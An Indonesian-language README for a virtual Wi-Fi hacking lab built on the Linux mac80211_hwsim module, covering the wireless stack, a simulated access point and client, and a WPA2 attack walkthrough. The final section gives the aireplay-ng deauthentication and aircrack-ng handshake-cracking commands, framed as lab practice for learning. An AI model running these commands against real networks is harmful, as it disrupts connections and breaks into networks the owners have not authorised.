# Lab Virtual Wireless Hacking

## Daftar Isi
- [Pendahuluan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#pendahuluan)
- [Disclaimer](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/README.md#disclaimer)
- [Pengenalan mac80211_hwsim](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#pengenalan-mac80211_hwsim)
  - [Apa itu mac80211_hwsim?](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#apa-itu-mac80211_hwsim)
  - [Cara Kerja](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#cara-kerja)
  - [Linux Wi-Fi Stack](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#linux-wi-fi-stack)
  - [Kapabilitas yang Didukung](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#kapabilitas-yang-didukung)
  - [Perbandingan dengan Adapter Fisik](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#perbandingan-dengan-adapter-fisik)
- [Persyaratan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#persyaratan)
- [Topologi Lab](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#topologi-lab)
- [Instalasi](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#instalasi)
- [Setup Lab](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#setup-lab)
  - [Persiapan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#persiapan)
  - [Konfigurasi Access Point](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#konfigurasi-access-point)
  - [Konfigurasi DHCP Server](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#konfigurasi-dhcp-server)
  - [Konfigurasi STA (Client)](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#konfigurasi-sta-client)
- [Simulasi Serangan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#simulasi-serangan)
  - [Crack WPA/WPA2-PSK dengan Aircrack-NG](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#crack-wpawpa2-psk-dengan-aircrack-ng)
- [Penutup](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#penutup)
  - [Keterbatasan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#keterbatasan)
  - [Kesimpulan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#kesimpulan)
  - [Referensi](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking#referensi)

## Pendahuluan

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/histori.png)

Wireless penetration testing memerlukan adapter fisik yang mendukung mode monitor dan packet injection, seperti [Alfa AWUS036ACH](https://www.alfa.com.tw/products/awus036ach_1?variant=40319795789896) (RTL8812AU) atau [TP-Link TL-WN722N V1](https://www.tp-link.com/id/support/download/tl-wn722n/) (Atheros AR9271), yang harganya tidak murah dan tidak semua orang mampu membelinya.

Dokumentasi ini hadir sebagai solusi alternatif menggunakan modul kernel [mac80211_hwsim](https://docs.kernel.org/6.1/networking/mac80211_hwsim/mac80211_hwsim.html) untuk mensimulasikan interface wireless virtual di Linux, sehingga wireless penetration testing dapat dipelajari dan dipraktikkan tanpa perangkat keras tambahan dalam lingkungan yang terisolasi dan aman.

## Disclaimer

> [!warning]
> Dokumentasi ini dibuat semata-mata untuk keperluan edukasi. Jangan gunakan teknik yang dipelajari di sini pada jaringan atau perangkat tanpa izin eksplisit dari pemiliknya.

## Pengenalan mac80211_hwsim

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/sleeping-tux-wireless_0.jpeg)

### Apa itu mac80211_hwsim?

`mac80211_hwsim` adalah modul kernel Linux yang dikembangkan oleh **Jouni Malinen** dan telah tersedia sejak kernel versi [2.6.27](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tag/?h=v2.6.27). Modul ini dirancang khusus untuk mensimulasikan perangkat wireless virtual langsung di dalam kernel tanpa memerlukan adapter fisik apapun.

Nama `mac80211_hwsim` sendiri berasal dari dua bagian. `mac80211` merujuk pada subsistem wireless kernel Linux yang mengimplementasikan protokol IEEE 802.11, sedangkan `hwsim` adalah singkatan dari hardware simulator. Jadi secara harfiah, `mac80211_hwsim` adalah simulator hardware untuk subsistem `mac80211`.

Modul ini banyak digunakan oleh developer kernel untuk menguji fitur wireless baru, oleh peneliti keamanan untuk mempelajari protokol Wi-Fi, serta oleh siapa saja yang ingin belajar wireless networking dan security tanpa harus memiliki adapter fisik.

### Cara Kerja

`mac80211_hwsim` bekerja dengan mendaftarkan dirinya ke subsistem `mac80211` sebagai driver hardware virtual. Ketika modul ini dimuat, kernel akan membuat sejumlah radio wireless virtual sesuai parameter yang diberikan. Setiap radio virtual ini kemudian muncul sebagai interface wireless (`wlan0`, `wlan1`, dst) yang dapat dikonfigurasi dan digunakan layaknya adapter fisik sungguhan.

Yang membuat `mac80211_hwsim` unik adalah cara ia mensimulasikan komunikasi antar interface. Alih-alih mengirimkan sinyal radio melalui udara, frame 802.11 yang dikirim oleh satu interface langsung diteruskan ke interface virtual lainnya di dalam kernel melalui mekanisme yang disebut `hwsim_tx_frame`. Proses ini sepenuhnya terjadi di dalam kernel tanpa melibatkan hardware apapun, sehingga komunikasi antar interface virtual berjalan dengan sangat cepat dan terisolasi dari dunia luar.

Karena `mac80211_hwsim` mendaftarkan diri di layer yang sama dengan driver fisik, semua layer di atasnya seperti `mac80211`, `cfg80211`, dan `nl80211` tetap berjalan normal. Hal ini membuat seluruh tool wireless standar di Linux dapat berjalan di atasnya tanpa modifikasi apapun.

### Linux Wi-Fi Stack

Sebelum memahami peran `mac80211_hwsim`, perlu diketahui terlebih dahulu bagaimana Linux mengorganisasi subsistem wireless-nya. Linux Wi-Fi Stack tersusun atas beberapa layer yang saling bertingkat, mulai dari userspace di lapisan paling atas hingga driver hardware di lapisan paling bawah.

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/linux%20wifi%20stack.png)

#### Penjelasan Setiap Layer

**Userspace**

Di lapisan paling atas terdapat tool yang digunakan langsung oleh pengguna. `iw` digunakan untuk mengkonfigurasi interface wireless seperti mengecek status, mengubah mode, atau melihat network yang tersedia. `wpa_supplicant` bertugas mengelola koneksi dari sisi STA (client), sedangkan `hostapd` bertugas menjalankan Access Point. Semua tool ini berkomunikasi ke kernel melalui mekanisme yang disebut Netlink socket.

**Kernel Space**

Kernel Space adalah lapisan inti dari sistem operasi Linux tempat seluruh subsistem wireless dikelola. Di sinilah semua permintaan dari userspace diproses, divalidasi, dan diteruskan ke driver yang sesuai. Tidak ada tool pengguna yang bisa mengakses lapisan ini secara langsung, melainkan harus melalui antarmuka yang telah disediakan oleh kernel.

**nl80211**

`nl80211` adalah antarmuka Netlink yang menjadi jembatan komunikasi antara userspace dan kernel untuk segala hal yang berkaitan dengan wireless. Setiap perintah dari `iw`, `wpa_supplicant`, maupun `hostapd` akan diterjemahkan menjadi pesan Netlink dan dikirim melalui layer ini.

**cfg80211**

`cfg80211` adalah Configuration API yang berada di dalam kernel. Layer ini bertugas memvalidasi konfigurasi wireless, mengelola aturan regulasi frekuensi per negara, serta menjadi perantara antara `nl80211` di atas dan `mac80211` di bawahnya. Semua driver wireless modern di Linux harus berinteraksi melalui `cfg80211`.

**mac80211**

`mac80211` adalah implementasi penuh dari protokol IEEE 802.11 di dalam kernel Linux. Layer ini menangani manajemen frame 802.11, proses asosiasi dan autentikasi, enkripsi (WEP, WPA, WPA2), serta power management. Layer inilah yang membuat sebuah driver wireless bisa berfungsi sebagai jaringan Wi-Fi yang sesungguhnya.

**mac80211_hwsim vs Driver Fisik**

Di lapisan paling bawah inilah perbedaan antara hardware nyata dan virtual terjadi. Pada kondisi normal, `mac80211` akan berkomunikasi dengan driver fisik seperti `ath9k` untuk chip Atheros atau `rtl8812au` untuk chip Realtek, yang kemudian mengontrol adapter fisik secara langsung melalui hardware.

`mac80211_hwsim` menggantikan posisi driver fisik tersebut. Alih-alih mengontrol hardware nyata, `mac80211_hwsim` mensimulasikan komunikasi antar interface wireless secara virtual di dalam kernel itu sendiri. Karena posisinya ada di layer yang sama dengan driver fisik, semua layer di atasnya (`mac80211`, `cfg80211`, `nl80211`) tetap berjalan normal tanpa perlu modifikasi apapun. Inilah alasan mengapa tool seperti `aircrack-ng`, `hostapd`, dan `wpa_supplicant` bisa berjalan di atas interface virtual `mac80211_hwsim` persis seperti saat berjalan di atas adapter fisik sungguhan.

### Kapabilitas yang Didukung

Meskipun bersifat virtual, `mac80211_hwsim` mendukung sebagian besar fitur yang dimiliki adapter fisik pada umumnya.

Mode operasi yang tersedia mencakup Access Point (AP) untuk membuat jaringan wireless, Managed (STA) untuk terhubung ke sebuah AP sebagai client, Monitor untuk menangkap semua frame di udara tanpa berasosiasi ke jaringan manapun, dan Ad-hoc untuk komunikasi peer-to-peer tanpa AP.

Dari sisi keamanan, `mac80211_hwsim` mendukung enkripsi WEP, WPA, WPA2, dan WPA3 dengan metode autentikasi PSK, SAE (Simultaneous Authentication of Equals), maupun Enterprise, sehingga simulasi serangan seperti capture handshake WPA/WPA2, password cracking, hingga pengujian ketahanan WPA3-SAE dapat dilakukan secara realistis.

`mac80211_hwsim` juga mendukung frame injection yang merupakan fitur krusial dalam wireless penetration testing. Fitur ini memungkinkan tool seperti `aireplay-ng` mengirimkan frame ke jaringan secara paksa, termasuk untuk keperluan serangan deauth.

Selain itu, modul ini mendukung beberapa virtual radio secara bersamaan, pergantian channel, dan berbagai mode frekuensi seperti 2.4GHz dan 5GHz.

### Perbandingan dengan Adapter Fisik

Tabel berikut menggambarkan perbedaan antara `mac80211_hwsim` dan adapter fisik seperti Alfa AWUS036ACH atau TP-Link TL-WN722N V1.

| Aspek | mac80211_hwsim | Adapter Fisik |
|:--:|:--:|:--:|
| Biaya | Gratis | Rp 300.000 - Rp 1.500.000 |
| Setup | Cukup load modul kernel | Perlu driver tambahan |
| Mode Monitor | Didukung | Didukung (tergantung chipset) |
| Frame Injection | Didukung | Didukung (tergantung chipset) |
| Sinyal RF Nyata | Tidak ada | Ada |
| Interferensi & Noise | Tidak disimulasikan | Ada |
| Jangkauan Sinyal | Tidak relevan | Terbatas jarak fisik |
| Portabilitas | Berjalan di VM sekalipun | Butuh port USB fisik |
| Cocok untuk Belajar | Sangat cocok | Cocok |
| Cocok untuk Real Testing | Tidak | Ya |

Dari tabel di atas terlihat bahwa `mac80211_hwsim` unggul dari sisi aksesibilitas dan kemudahan setup, sementara adapter fisik unggul dalam hal realisme kondisi jaringan. Untuk keperluan pembelajaran seperti yang dibahas dalam dokumentasi ini, `mac80211_hwsim` adalah pilihan yang sangat praktis karena seluruh proses dapat dilakukan hanya dengan sebuah mesin Linux tanpa biaya tambahan apapun.

## Persyaratan

- Linux (Kernel >= 2.6.27)
- `mac80211_hwsim`: Modul kernel Linux untuk mensimulasikan interface wireless virtual
- `iw`: Tool untuk mengkonfigurasi dan mengelola interface wireless di Linux
- `hostapd`: Tool untuk membuat Access Point virtual di Linux
- `dnsmasq`: Tool untuk membuat DHCP Server dan DNS forwarder
- `wpa_supplicant`: Tool untuk menghubungkan STA (client) ke Access Point
- `airmon-ng`: Tool untuk mengaktifkan mode monitor pada interface wireless
- `airodump-ng`: Tool untuk melakukan scan dan capture paket pada jaringan Wi-Fi
- `aireplay-ng`: Tool untuk menjalankan serangan (seperti deauthentication) pada jaringan Wi-Fi
- `aircrack-ng`: Tool untuk meng-crack kunci WEP dan WPA/WPA2-PSK dari hasil capture

## Topologi Lab

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/topologi.png)

**Daftar interface:**
- `wlan0`: digunakan oleh `hostapd` & `dnsmasq`
- `wlan1`: digunakan oleh `wpa_supplicant`
- `wlan2`: digunakan oleh tools pengujian

## Instalasi

```bash
sudo apt-get update
sudo apt-get install iw hostapd dnsmasq wpasupplicant isc-dhcp-client aircrack-ng
```

## Setup Lab

### Persiapan

#### 1. Pastikan modul tersedia:

```bash
modinfo mac80211_hwsim
```

#### 2. Load modul dengan 3 radio virtual:

```bash
sudo modprobe mac80211_hwsim radios=3
```

Load modul secara otomatis saat boot:

```bash
echo "mac80211_hwsim" | sudo tee /etc/modules-load.d/mac80211_hwsim.conf
echo "options mac80211_hwsim radios=3" | sudo tee /etc/modprobe.d/mac80211_hwsim.conf
```

#### 3. Lihat semua interface wireless yang aktif:

```bash
iw dev
```

### Konfigurasi Access Point

#### 1. Set IP statis pada interface `wlan0`:

```bash
sudo ip addr flush dev wlan0
sudo ip addr add 10.10.10.1/24 dev wlan0
sudo ip link set wlan0 up
```

> [!note]
> IP address ini bersifat sementara dan akan hilang saat sistem di-reboot.

#### 2. Buat file konfigurasi `hostapd.conf`:

```bash
nano hostapd.conf
```

Isi dengan:

```bash
interface=wlan0
driver=nl80211
ssid=WPA2-Personal
hw_mode=g
channel=6
country_code=ID
auth_algs=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

#### 3. Stop service yang konflik dengan hostapd:

```bash
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

#### 4. Jalankan hostapd:

```bash
sudo hostapd hostapd.conf
```

### Konfigurasi DHCP Server

#### 1. Buat file konfigurasi `dnsmasq.conf`:

```bash
nano dnsmasq.conf
```

Isi dengan:

```bash
interface=wlan0
bind-interfaces
dhcp-range=10.10.10.2,10.10.10.254,255.255.255.0,12h
dhcp-option=3,10.10.10.1
no-resolv
no-hosts
log-dhcp
```

#### 2. Jalankan dnsmasq:

```bash
sudo dnsmasq -C dnsmasq.conf -d
```

### Konfigurasi STA (Client)

#### 1. Buat file konfigurasi `wpa_supplicant.conf`:

```bash
nano wpa_supplicant.conf
```

Isi dengan:

```bash
network={
    ssid="WPA2-Personal"
    psk="12345678"
    key_mgmt=WPA-PSK
}
```

#### 2. Jalankan wpa_supplicant:

```bash
sudo wpa_supplicant -D nl80211 -i wlan1 -c wpa_supplicant.conf
```

#### 3. Request IP dari DHCP Server:

```bash
sudo dhclient wlan1
```

#### 4. Verifikasi koneksi:

```bash
# Cek status koneksi
iw dev wlan1 link

# Cek IP yang didapat
ip addr show wlan1
```

## Simulasi Serangan

### Crack WPA/WPA2-PSK dengan Aircrack-NG

#### 1. Lihat semua interface wireless yang aktif:

```bash
sudo airmon-ng
```

#### 2. Cek proses yang mengganggu mode monitor:

```bash
sudo airmon-ng check
```

#### 3. Matikan proses yang mengganggu mode monitor:

```bash
sudo airmon-ng check kill
```

#### 4. Aktifkan mode monitor:

```bash
sudo airmon-ng start wlan2
```

Setelah mode monitor aktif, nama interface `wlan2` akan berubah menjadi `wlan2mon`.

#### 5. Scan jaringan Wi-Fi WPA/WPA2:

```bash
sudo airodump-ng -t wpa wlan2mon
```

#### 6. Capture handshake WPA/WPA2:

```bash
sudo airodump-ng -d [bssid] -c [channel] -w [output] wlan2mon
```

#### 7. Jalankan serangan deauth:

```bash
sudo aireplay-ng -0 10 -a [bssid] -c [mac_client] wlan2mon
```

#### 8. Crack password WPA/WPA2:

```bash
aircrack-ng -a 2 [file_capture] -w [wordlist]
```

## Penutup

### Keterbatasan

Meskipun lab virtual ini cukup untuk keperluan pembelajaran, terdapat beberapa keterbatasan yang perlu diperhatikan.

- Interface wireless virtual tidak memiliki karakteristik sinyal nyata seperti jangkauan, interferensi, dan noise.
- Kecepatan capture paket dan throughput jauh di bawah adapter fisik pada umumnya.
- Seluruh konfigurasi bersifat sementara dan akan hilang saat sistem di-reboot.

### Kesimpulan

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/end.png)

Melalui dokumentasi ini, kita telah berhasil membangun sebuah lab virtual wireless hacking yang sepenuhnya berjalan tanpa memerlukan hardware tambahan. Dengan memanfaatkan modul kernel `mac80211_hwsim`, kita dapat mensimulasikan tiga interface wireless virtual (`wlan0`, `wlan1`, `wlan2`) yang masing-masing berperan sebagai Access Point, client, dan interface pengujian.

Dari lab ini kita juga telah mempelajari dan mempraktikkan alur kerja dasar wireless penetration testing, mulai dari membangun infrastruktur jaringan wireless virtual menggunakan `hostapd`, `dnsmasq`, dan `wpa_supplicant`, hingga melakukan simulasi serangan nyata seperti capture handshake WPA/WPA2, serangan deauth, dan password cracking menggunakan `aircrack-ng`.

Pendekatan ini sangat berguna bagi siapa saja yang ingin belajar wireless security tanpa harus mengeluarkan biaya untuk membeli adapter fisik khusus, sekaligus memastikan bahwa seluruh proses latihan berlangsung dalam lingkungan yang terisolasi dan tidak merugikan pihak lain.

### Referensi

- [mac80211_hwsim - Linux Kernel Documentation](https://docs.kernel.org/6.1/networking/mac80211_hwsim/mac80211_hwsim.html)
- [hostapd - Linux Documentation](https://w1.fi/hostapd/)
- [wpa_supplicant - Linux Documentation](https://w1.fi/wpa_supplicant/)
- [dnsmasq - Documentation](https://dnsmasq.org/doc.html)
- [Aircrack-ng - Documentation](https://www.aircrack-ng.org/documentation.html)
- [Airmon-ng - Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
- [Airodump-ng - Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
- [Aireplay-ng - Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)

